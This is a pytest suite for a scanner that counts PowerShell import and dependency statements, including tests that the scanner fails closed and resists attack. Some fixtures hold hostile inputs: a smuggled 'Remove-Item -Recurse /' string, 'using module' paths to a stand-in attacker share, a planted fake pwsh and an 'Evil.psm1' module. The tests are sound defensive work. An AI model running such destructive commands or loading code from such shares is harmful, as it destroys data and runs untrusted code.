"""PowerShell dependency counting through PowerShell's own parser (issue #7437)."""

import importlib.util
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest

from tests.pwsh_launcher_probe import _ON_CI, require_working_pwsh

from .test_assess import _commit, _init_repo, _regression_argv, _run_git

_SCRIPT = (
    Path(__file__).resolve().parents[3]
    / ".claude"
    / "skills"
    / "code-qualities-assessment"
    / "scripts"
    / "assess.py"
)
_spec = importlib.util.spec_from_file_location("assess", _SCRIPT)
assert _spec is not None and _spec.loader is not None
_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_mod)
assess_content = _mod.assess_content


def _coupling(source: str, name: str = "Script.ps1") -> Any:
    require_working_pwsh()
    return assess_content(Path(name), source).coupling


def _fake_pwsh(
    monkeypatch: pytest.MonkeyPatch,
    *,
    stdout: str = '{"count":0,"errors":[]}',
    returncode: int = 0,
    stderr: str = "",
    raises: BaseException | None = None,
) -> list[dict[str, Any]]:
    """Replace pwsh with a fake that records each call and returns a fixed result."""
    calls: list[dict[str, Any]] = []
    monkeypatch.setattr(
        shutil, "which", lambda name, path=None: "/fake/pwsh" if name == "pwsh" else None
    )

    def fake_run(argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
        cwd = Path(kwargs["cwd"])
        calls.append({"argv": argv, "cwd_entries": sorted(cwd.iterdir()), **kwargs})
        if raises is not None:
            raise raises
        return subprocess.CompletedProcess(argv, returncode, stdout, stderr)

    monkeypatch.setattr(subprocess, "run", fake_run)
    return calls


def test_ci_runner_provides_pwsh() -> None:
    """The real-parser tests below skip without pwsh; on CI that skip must not hide them."""
    if not _ON_CI:
        pytest.skip("only CI must provide pwsh; local runs may lack it")

    assert shutil.which("pwsh") is not None


@pytest.mark.parametrize("suffix", [".ps1", ".psm1", ".psd1", ".PS1"])
def test_powershell_suffixes_are_detected(suffix: str) -> None:
    assert _mod.detect_language(Path(f"Script{suffix}")) == "powershell"


@pytest.mark.parametrize(
    "statement",
    [
        "Import-Module Pester",
        "Import-Module -Name Pester -MinimumVersion 5.7.1",
        "import-module ./Local.psm1",
        "IMPORT-MODULE Pester",
        "ipmo Pester",
        "& Import-Module Pester",
        "Microsoft.PowerShell.Core\\Import-Module Pester",
        "$m = Import-Module Pester -PassThru",
        "if ($true) { Import-Module Pester }",
        "using module ./Local.psm1",
        "USING Module ./Local.psm1",
        "UsInG namespace System.Text",
        "using module Pester",
        "using namespace System.Text",
        "using assembly System.Xml",
        "#Requires -Modules Pester",
        "#requires -modules @{ ModuleName = 'Pester'; ModuleVersion = '5.7.1' }",
    ],
)
def test_each_dependency_form_counts_once(statement: str) -> None:
    """AC1/AC2: Every listed statement form is one dependency, read from the syntax tree."""
    coupling = _coupling(f"{statement}\n")

    assert coupling.reasons[0] == "1 import/dependency statements"
    assert coupling.value == 9.0
    assert coupling.confidence == 0.6


@pytest.mark.parametrize(
    "source",
    [
        '$text = "Import-Module NotADependency"',
        "$text = 'using module NotADependency'",
        "$text = @'\nImport-Module NotADependency\nusing namespace Not.One\n'@",
        "# Import-Module NotADependency",
        "<#\nImport-Module NotADependency\n#Requires -Modules NotOne\n#>",
        "#Requires -Version 7.0",
        "#Requires -PSEdition Core",
        "Get-Module -ListAvailable",
        "Import-ModuleHelper Pester",
        "Invoke-Command -ScriptBlock { $using:Name }",
        "Export-ModuleMember -Function Get-A, Set-B",
        "Write-Host 'héllo ✓'",
    ],
)
def test_strings_comments_and_lookalikes_are_not_dependencies(source: str) -> None:
    """AC1: Literal text, ordinary comments, and other commands add no dependency."""
    coupling = _coupling(f"{source}\n")

    assert coupling.reasons[0] == "0 import/dependency statements"
    assert coupling.value == 10.0


def test_mixed_statements_count_from_the_tree() -> None:
    source = (
        "#Requires -Modules Pester\n"
        "using module ./Local.psm1\n"
        "using namespace System.Text\n"
        "using assembly System.Xml\n"
        "Import-Module A\n"
        "ipmo B\n"
        '$skip = "Import-Module C"\n'
        "# Import-Module D\n"
        "Write-Host 'café'\n"
    )

    coupling = _coupling(source, "Module.psm1")

    assert coupling.reasons[0] == "6 import/dependency statements"
    assert coupling.value == 4.0


def test_unresolvable_references_are_not_syntax_errors() -> None:
    """A module or assembly this machine lacks still counts and never fails the scan."""
    coupling = _coupling(
        "using module NoSuchModuleForIssue7437\nusing assembly NoSuch.Assembly.Issue7437\n"
    )

    assert coupling.reasons[0] == "2 import/dependency statements"


def test_parsing_never_runs_a_referenced_module(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Scanning untrusted source must not execute a module it references."""
    marker = tmp_path / "executed.txt"
    module = tmp_path / "Evil.psm1"
    module.write_text(f"Set-Content -Path '{marker}' -Value ran\nclass Evil {{}}\n", "utf-8")
    monkeypatch.chdir(tmp_path)

    coupling = _coupling(f"using module {module}\nusing module ./Evil.psm1\n[Evil]::new()\n")

    assert coupling.reasons[0] == "2 import/dependency statements"
    assert not marker.exists()


def test_psd1_manifest_is_assessed() -> None:
    coupling = _coupling("@{ RootModule = 'Module.psm1'; ModuleVersion = '1.0.0' }\n", "M.psd1")

    assert coupling.reasons[0] == "0 import/dependency statements"
    assert coupling.confidence == 0.6


def test_invalid_powershell_fails_cli_instead_of_reporting_no_dependencies(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """AC2: A syntax error must not become a zero-dependency pass."""
    require_working_pwsh()
    monkeypatch.chdir(tmp_path)
    target = tmp_path / "Invalid.ps1"
    target.write_text("Import-Module A\nfunction Broken( {\n", encoding="utf-8")
    report = tmp_path / "report.json"

    result = _mod.main(["--target", str(target), "--format", "json", "--output", str(report)])
    output = capsys.readouterr()

    assert result == 1
    assert "PowerShell" in output.err
    assert "syntax error" in output.err
    assert "line 2" in output.err
    assert target.name in output.err
    assert not output.out
    assert not report.exists()


def test_missing_pwsh_fails_cli_without_affecting_python(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """AC2: A missing parser fails explicitly and never reports a PowerShell score."""
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: None)
    script = tmp_path / "Script.ps1"
    script.write_text("Import-Module Pester\n", encoding="utf-8")
    python = tmp_path / "example.py"
    python.write_text("def example():\n    return 1\n", encoding="utf-8")

    result = _mod.main(["--target", str(script), "--format", "json"])
    output = capsys.readouterr()

    assert result == 1
    assert "pwsh" in output.err
    assert "not on PATH" in output.err
    assert script.name in output.err
    assert not output.out
    assert _mod.main(["--target", str(python), "--format", "json"]) == 0


@pytest.mark.parametrize(
    ("fake", "message"),
    [
        ({"raises": subprocess.TimeoutExpired(["pwsh"], 60)}, "timed out after 60 seconds"),
        ({"raises": PermissionError("denied")}, "failed to start: denied"),
        ({"returncode": 1, "stderr": "ParserFailure"}, "exited 1: ParserFailure"),
        ({"returncode": 3, "stderr": "", "stdout": ""}, "exited 3: no output"),
        ({"stdout": "not json"}, "unreadable output"),
        ({"stdout": "[1, 2]"}, "returned list"),
        ({"stdout": '{"count":-1,"errors":[]}'}, "returned count -1"),
        ({"stdout": '{"count":"3","errors":[]}'}, "returned count '3'"),
        ({"stdout": '{"count":true,"errors":[]}'}, "returned count True"),
        ({"stdout": '{"errors":[]}'}, "returned count None"),
        ({"stdout": '{"count":1,"errors":"bad"}'}, "returned errors as 'bad'"),
        ({"stdout": '{"count":1}'}, "returned errors as None"),
        (
            {"stdout": '{"count":1,"errors":{"id":"X","line":4,"message":"Bad token."}}'},
            "1 syntax error(s), first at line 4: Bad token.",
        ),
    ],
)
def test_broken_parser_results_fail_closed(
    monkeypatch: pytest.MonkeyPatch, fake: dict[str, Any], message: str
) -> None:
    """No parser failure mode returns a count."""
    _fake_pwsh(monkeypatch, **fake)

    with pytest.raises(_mod.PowerShellParserError) as excinfo:
        assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert message in str(excinfo.value)


def test_source_travels_on_stdin_from_an_empty_directory(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """CWE-78: source text never reaches the command line, and relative paths resolve nowhere."""
    calls = _fake_pwsh(monkeypatch, stdout='{"count":1,"errors":[]}')
    source = "Import-Module A; $x = '\"; Remove-Item -Recurse /; \"'\n"

    assess_content(Path("Script.ps1"), source)

    (call,) = calls
    assert call["argv"][0] == "/fake/pwsh"
    assert call["argv"][1:5] == ["-NoLogo", "-NoProfile", "-NonInteractive", "-EncodedCommand"]
    assert not any("Remove-Item" in part or "Import-Module" in part for part in call["argv"])
    assert call["input"] and "Import-Module" not in call["input"]
    assert call["cwd_entries"] == []
    assert call["timeout"] == 60
    assert "shell" not in call


def test_raw_lines_keep_requires_statements() -> None:
    """The comment-line filter must not drop #Requires before the parser sees it."""
    coupling = _coupling("#Requires -Modules A\n#Requires -Modules B\n")

    assert coupling.reasons[0] == "2 import/dependency statements"


def test_new_powershell_import_regresses_coupling_in_regression_mode(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """The gate compares PowerShell coupling base to head like any tuned language."""
    require_working_pwsh()
    _init_repo(tmp_path)
    _commit(tmp_path, "Tool.ps1", "Write-Output 1\n", "base")
    _run_git(tmp_path, "checkout", "-b", "feature")
    _commit(tmp_path, "Tool.ps1", "Import-Module A\nImport-Module B\nWrite-Output 1\n", "head")
    monkeypatch.chdir(tmp_path)

    result = _mod.main(_regression_argv())
    output = capsys.readouterr()

    assert result == 10
    assert "Tool.ps1: coupling regressed 10.0 -> 8.0" in output.err


def test_unparseable_base_powershell_fails_regression_mode_with_revision(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    require_working_pwsh()
    _init_repo(tmp_path)
    _commit(tmp_path, "Tool.ps1", "function Broken( {\n", "base is invalid")
    _run_git(tmp_path, "checkout", "-b", "feature")
    _commit(tmp_path, "Tool.ps1", "Write-Output 1\n", "head is valid")
    monkeypatch.chdir(tmp_path)

    result = _mod.main(_regression_argv())
    output = capsys.readouterr()

    assert result == 1
    assert "Tool.ps1 at " in output.err
    assert "syntax error" in output.err
    assert not output.out


@pytest.mark.parametrize(
    "plugin_parts",
    [
        ("claude",),
        ("copilot-cli",),
        ("codex",),
        ("cursor",),
        ("hermes", "project-toolkit-delivery"),
        ("muse",),
    ],
)
def test_shipped_powershell_counter_runs_from_consumer_directory(
    tmp_path: Path, plugin_parts: tuple[str, ...]
) -> None:
    """AC3: Every shipped scanner counts PowerShell outside its own plugin directory."""
    require_working_pwsh()
    root = Path(__file__).resolve().parents[3]
    script = root.joinpath(
        "src", *plugin_parts, "skills", "code-qualities-assessment", "scripts", "assess.py"
    )
    target = tmp_path / "Consumer.psm1"
    target.write_text(
        "#Requires -Modules Pester\nusing namespace System.Text\n"
        "$t = 'Import-Module NotOne'\nExport-ModuleMember -Function Get-A, Set-B\n",
        encoding="utf-8",
    )

    result = subprocess.run(
        [sys.executable, "-I", str(script), "--target", str(target), "--format", "json"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
        timeout=120,
    )

    assert result.returncode == 0, result.stderr
    coupling = json.loads(result.stdout)["files"][0]["coupling"]
    assert coupling["value"] == 8.0
    assert coupling["confidence"] == 0.6
    assert coupling["reasons"][0] == "2 import/dependency statements"


def test_relative_path_entries_never_supply_pwsh(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """CWE-427: a pwsh planted in the checkout and reached by a relative PATH entry never runs."""
    planted = tmp_path / "bin" / "pwsh"
    planted.parent.mkdir()
    planted.write_text("#!/bin/sh\necho planted\n", encoding="utf-8")
    planted.chmod(0o755)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("PATH", "bin")

    with pytest.raises(_mod.PowerShellParserError, match="not on PATH"):
        assess_content(Path("Script.ps1"), "Import-Module A\n")


def test_pwsh_inside_the_scanned_directory_is_refused(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls = _fake_pwsh(monkeypatch)
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: str(tmp_path / "pwsh"))
    monkeypatch.chdir(tmp_path)

    with pytest.raises(_mod.PowerShellParserError, match="inside the scanned directory"):
        assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls == []


def test_windows_requires_pwsh_exe(monkeypatch: pytest.MonkeyPatch) -> None:
    calls = _fake_pwsh(monkeypatch)
    monkeypatch.setattr(shutil, "which", lambda _name, path=None: "/opt/pwsh/pwsh.cmd")
    monkeypatch.setattr(sys, "platform", "win32")

    with pytest.raises(_mod.PowerShellParserError, match="must be pwsh.exe"):
        assess_content(Path("Script.ps1"), "Import-Module A\n")

    assert calls == []


def test_pwsh_never_receives_a_using_keyword(monkeypatch: pytest.MonkeyPatch) -> None:
    """CWE-829: no using statement reaches pwsh, so it cannot resolve a UNC or local target."""
    import base64

    calls = _fake_pwsh(monkeypatch, stdout='{"count":2,"errors":[]}')
    source = (
        "using module \\\\attacker\\share\\Evil.psm1\n"
        "USING assembly //attacker/share/Evil.dll\n"
        "Write-Host $using:Name 'Housing'\n"
    )

    assess_content(Path("Script.ps1"), source)

    (call,) = calls
    sent = base64.b64decode(call["input"]).decode("utf-8")
    residue = sent.replace(_mod._PWSH_USING_SENTINEL, "")
    assert re.search("using", residue, re.IGNORECASE | re.ASCII) is None
    assert sent.count("\n") == source.count("\n")
    assert sent.count(_mod._PWSH_USING_SENTINEL) == 4


def test_neutralized_source_resolves_no_module_or_assembly() -> None:
    """Without the rewrite, pwsh reports ErrorLoadingAssembly and ModuleNotFoundDuringParse."""
    require_working_pwsh()
    source = "using assembly NoSuch.Assembly.Issue7437\nusing module NoSuchModuleIssue7437\n"

    result = _mod._run_pwsh_counter(source)

    assert result["errors"] == []
    assert result["count"] == 2


@pytest.mark.parametrize(
    "source",
    [
        "& 'using' module Pester",
        ". using module Pester",
        "Write-Output using module Pester",
        "using",
    ],
)
def test_using_text_that_is_not_a_using_statement_does_not_count(source: str) -> None:
    coupling = _coupling(f"{source}\n")

    assert coupling.reasons[0] == "0 import/dependency statements"
